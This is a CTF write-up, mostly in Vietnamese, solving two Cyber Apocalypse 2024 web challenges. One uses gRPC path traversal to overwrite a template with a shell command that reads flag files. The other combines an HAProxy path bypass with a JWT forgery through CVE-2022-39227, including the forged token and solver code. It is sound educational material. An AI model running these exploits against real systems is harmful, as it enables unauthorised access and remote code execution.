---
title: Cyber Apocalypse CTF 2024
date: 2024-03-20
tags:
 - JWT
 - Pathtraversal
categories:
 - CTF
---

## WEB: testimonial

:::info Challenge
As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

[`📁 testimonial.zip`](https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/ERI23X926BlGnfBSuAzRm3cBpgayVeZHktM_NKip2LdEaA?e=3SujLE)

:::


- Bài cho chúng ta web đơn giản, cho phép lưu các note vào folder của server.
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024.png)
- File flag nằm ở `/` và được đặt tên random
```bash
# Change flag name
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```
- Server sử dụng gRPC để xử lý logic
- Code được chạy với `Air` - live reload for Go apps. Cụ thể hơn đối với app này là tự reload các file "tpl", "tmpl", "templ", "html"


Khi submit một note mới, 2 params được truyền vào là `customer` và `testimonial`. Với `customer` là tên file được lưu vào `public/testimonials/` và `testimonial` là nội dung file.
```javascript 
func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
    customer := r.URL.Query().Get("customer")
    testimonial := r.URL.Query().Get("testimonial")
    
    ...

    if err := c.SendTestimonial(customer, testimonial); err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
	}
    }
    ...
}
```
Hai param được truyền vào hàm `SendTestimonial`. Thông qua hàm này, tên file đã bị filter và loại bỏ tất cả các kí tự có hại
--> Không thể pathtraversal để ghi đè file được. 
```javascript 
func (c *Client) SendTestimonial(customer, testimonial string) error {
    ...
    for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
        customer = strings.ReplaceAll(customer, char, "")
    }

    _, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
    ...
}
```

Tuy nhiên, đó chỉ là những đoạn code để xử lý ở phía client. Đoạn code xử lý chính của server với gRPC lại không có bất kì biện pháp phòng chống nào.
```javascript 
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
    ...
    err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
    ...
}
```
Có thể thấy, code format `req.Customer` và write file mà không hề kiểm tra các kí tự xấu. Nếu ta có thể gọi thẳng đến gRPC server mà không cần thông qua các bước xử lý rườm rà thì có thể write file mới, hay ghi đè file cũ một cách dễ dàng.

Như vậy, hướng đi là tạo một gRPC client mới, connect đến gRPC server và SubmitTestimonial, ghi đè file `view/home/index.templ`, khi file bị thay đổi, app cũng sẽ reload để cập nhật nội dụng mới của file.

Tạo file `index.tmpl` mới thay thế cho nội dung file cũ để đọc flag 
:::details index.tmpl
```templ 
package home

import (
    "fmt"
    "os/exec"
)

func getFlag() string {
    cmd := exec.Command("/bin/sh", "-c", "cat /flag*.txt")
    out, err := cmd.Output()
    if err != nil {
        return "Error"
    }
    return string(out)
}

templ Index() {
    {getFlag()}
}
```
:::

Tạo gRPC client, submit testimonial để ghi đè file có sẵn với pathtraversal, mình dựa vào src gốc để tạo gRPC client 
:::details solve.go
```go 
package main

import (
    "fmt"
    "htbchal/client"
    "log"
    "os"
)

func HandleHomeIndex(customer, testimonial string) {
    if customer != "" && testimonial != "" {
        c, err := client.GetClient()
        if err != nil {
            log.Fatalf("Error getting client: %v", err)
        }

        if err := c.SendTestimonial(customer, testimonial); err != nil {
            log.Fatalf("Error sending testimonial: %v", err)
        }
    }
}

func main() {
    dat, err := os.ReadFile("newhome.templ")
    if err != nil {
        log.Fatalf("Error reading file: %v", err)
    }

    fmt.Println("Submitting testimonial...")
    HandleHomeIndex("../../view/home/index.templ", string(dat))
}

```
:::
Chỉ cần chạy file `solve.go` để submit testimonial lên cho server, sau đó reload lại trang và lấy flag 


## WEB: Locktalk
:::info Challenge
In "The Ransomware Dystopia," LockTalk ...(sh1t)... against the encroaching darkness.

[`📁 web_locktalk.zip`](https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/EfSRFaWRkXhMqhSZrQQYtnEBA3tblkQuYSktpQsAY1dH8Q?e=eaFMJk)
:::

- App cho 3 API Endpoints
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-1.png)
Có hai endpoint quan trọng là `get_ticket` để lấy jwt token và `flag` để lấy flag dựa vào jwt token.
```python
@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():
    ...
    claims = {
        "role": "guest",
        ...
    }
    ...
    
@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    ...
```
Để lấy được flag thì yêu cầu jwt token phải có role là `administrators`, tuy nhiên token được generate ra từ `/get_ticket` là `guest`. Vậy phải faki jwt để lấy được flag.

Tuy nhiên, khi GET `/api/v1/get_ticket` lại bị **403 Forbidden**, ban đầu mình không đọc kĩ nên không để ý app sử dụng haproxy. Ngó qua config của haproxy thì thấy như sau
```config 
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```
khi GET đến thì sẽ bị proxy chặn lại, ACL kiểm tra nếu url bắt đầu với `/api/v1/get_ticket` thì chặn lại, ta có thể bypass bằng cách GET `/api/v1/../v1/get_ticket`.
> Ngoài ra có thể bypass với `//api/v1/get_ticket` (shin24)
>
> Hoặc dựa vào haproxy version hiện tại là 2.8.1, bị dính lỗ hổng bảo mật [CVE-2023-45539](https://www.cvedetails.com/cve/CVE-2023-45539/)


![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-2.png)
Đã có jwt với role là `guest`, ta cần tìm cách edit jwt để có thể chỉnh thành `admin`.
Mà ở đây app sử dụng [python-jwt v3.3.3](https://pypi.org/project/python-jwt/) để xử lý jwt. Đây cũng là một phiên bản cũ và bị dính lỗ hổng bảo mật [CVE-2022-39227](https://nvd.nist.gov/vuln/detail/CVE-2022-39227) cho phép ta chỉnh sửa, giả mạo jwt mới với sign cũ.

Đến đây ta chỉ cần dựa vào CVE-2022-39227 chỉnh sửa jwt token từ role `guest` thành `administrators` và GET `/api/v1/flag` với jwt token để lấy flag.

### Về CVE-2022-39227
`python-jwt` sau đó đã cập nhật lên v3.3.4 để fix lỗi ([#88ad9e6](https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9)), cụ thể thêm hàm để check jwt format
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-3.png)
Ở phiên bản cũ, ta có thể đưa vào JSON string thay vì JWT string format, dẫn đến việc giả mạo dữ liệu mà vẫn có thể verify thành công.

Khi GET `/api/v1/flag` cùng jwt, app sẽ gọi hàm verify jwt được truyền vào
```python 
def verify_jwt(jwt, #jwt
               pub_key=None, #current_app.config.get('JWT_SECRET_KEY')
               allowed_algs=None, # ['PS256']
               iat_skew=timedelta(),
               checks_optional=False,
               ignore_not_implemented=False):
    ...
    header, claims, _ = jwt.split('.')
    parsed_header = json_decode(base64url_decode(header))
    
    ...
    if pub_key:
        token = JWS()
        token.allowed_algs = allowed_algs
        token.deserialize(jwt, pub_key)
    elif 'none' not in allowed_algs:
        raise _JWTError('no key but none alg not allowed')

    parsed_claims = json_decode(base64url_decode(claims))
    ...
    return parsed_header, parsed_claims
```
Code tách jwt được truyền vào theo kí tự `.` thành 3 phần. Với phần tử đầu tiên là `header`, thứ hai là `claims` (payload) và signature không sử dụng đến.
Sau đó gọi `token.deserialize` để deserialize jwt, nếu có lỗi gì với jwt thì raise error, ngược lại thì trả về 2 dict được loads sau khi decode base64.

Trace vào hàm `deserialize`, ta thấy `raw_jws` ban đầu được xem là JSON string, app cố gắng để loads JSON từ `raw_jns`. Nếu không được thì mới xem đó là JWT format và split theo kí tự `.`
Nếu đưa vào JWT đã bị thay đổi theo jwt format thì sẽ verify thất bại, ta cần thử đưa vào jwt dưới dạng JSON string.
```python 
    def deserialize(self, raw_jws, key=None, alg=None):
        ...
        try:
            try:
                djws = json_decode(raw_jws)
                ...
            except ValueError:
                data = raw_jws.split('.')
                ...
        except Exception as e:  # pylint: disable=broad-except
            raise InvalidJWSObject('Invalid format') from e

        if key:
            self.verify(key, alg)
```
Tập trung vào trường hợp `json_decode` thành công. Code sẽ lấy payload (claims), signature, protected (header) từ `djws` và tiến hành verify.
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-4.png)
Ta cần đưa vào jwt thỏa mãn:
- Là dạng JSON string
- Sau khi split kí tự '.' chia ra 3 phần: header, payload và \_ (KHÔNG QUAN TRỌNG 💣💥💥)

Vì hàm `verify_jwt` chỉ return về 2 phần đầu, và hàm `desrialize` dựa vào dict keys (protected, payload, signature,...) để dựng lại jwt token và verify
--> Có thể fake 2 phần đầu là 2 phần đã bị thay đổi, và jwt token được verify là jwt token cũ.
```json 
{
  "header.new_payload.hehe":"huhu",
  "protected": header,
  "payload": original_payload,
  "signature": signature
}
```
Từ payload này, Có thể thấy jwt đưa vào `app/v1/flag` thỏa mãn cả hai điều kiện trên.

Cụ thể với jwt là
```
eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5OTQ4MTAsImlhdCI6MTcxMDk5MTIxMCwianRpIjoiMkt1NkN5cUZrLTdjSXBsV1FDNzVzZyIsIm5iZiI6MTcxMDk5MTIxMCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.TDMdUJYNSqpVxZKFLAD9vZnYco4i-h9rC5RZIQd9eO4KhsXt_K6L1iVidAAmMUOh8ZT8TMgLVqHfWWG4ymqeC-FGEAR4yNzwHP5IyvrOMVxYWboiR0vbxf-dREMZ5ikKATdNhENEyA7MoQq_alyU5H6csxJKmV9kchJviyB58OQ06BL7XhVC4vkOkiHZP_4N5xs_CQm3Za7mVwGiNrv35R4qlX3FJB2UseDpu-kzga1AtgKhat_zSthDBIlXQUmyZFk6sd8FyzHNKTm_pR2JYaebyutmDvIdhOgiNK0hYTjuamBBEeWMMX49k4pbe33Vrrh-oyF58SkCB2fCUhnq-Q
```
Sẽ thành
```json
{
  "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiAxNzEwOTk0ODEwLCAiaWF0IjogMTcxMDk5MTIxMCwgImp0aSI6ICIyS3U2Q3lxRmstN2NJcGxXUUM3NXNnIiwgIm5iZiI6IDE3MTA5OTEyMTAsICJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0.hehe": "huhu",
  "protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9",
  "payload":"eyJleHAiOjE3MTA5OTQ4MTAsImlhdCI6MTcxMDk5MTIxMCwianRpIjoiMkt1NkN5cUZrLTdjSXBsV1FDNzVzZyIsIm5iZiI6MTcxMDk5MTIxMCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ",
  "signature":"TDMdUJYNSqpVxZKFLAD9vZnYco4i-h9rC5RZIQd9eO4KhsXt_K6L1iVidAAmMUOh8ZT8TMgLVqHfWWG4ymqeC-FGEAR4yNzwHP5IyvrOMVxYWboiR0vbxf-dREMZ5ikKATdNhENEyA7MoQq_alyU5H6csxJKmV9kchJviyB58OQ06BL7XhVC4vkOkiHZP_4N5xs_CQm3Za7mVwGiNrv35R4qlX3FJB2UseDpu-kzga1AtgKhat_zSthDBIlXQUmyZFk6sd8FyzHNKTm_pR2JYaebyutmDvIdhOgiNK0hYTjuamBBEeWMMX49k4pbe33Vrrh-oyF58SkCB2fCUhnq-Q"
}
```
Sau khi split, header sẽ là `{"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9` nhưng vẫn có thể decode và loads thành công
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-5.png)

Sau đó jwt được deserilize và verify
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-6.png)
Cuối cùng jwt được verify qua JWSCore, vì param `header` được truyền vào từ `protected` nên khi tạo JSONG string, mình phải dùng `protected`.
![image](assets/cyber-apocalypse-2024/cyber-apocalypse-2024-7.png)


---
Bài viết tham khảo thêm từ [@user0x1337/CVE-2022-39227](https://github.com/user0x1337/CVE-2022-39227)

#
*Update later*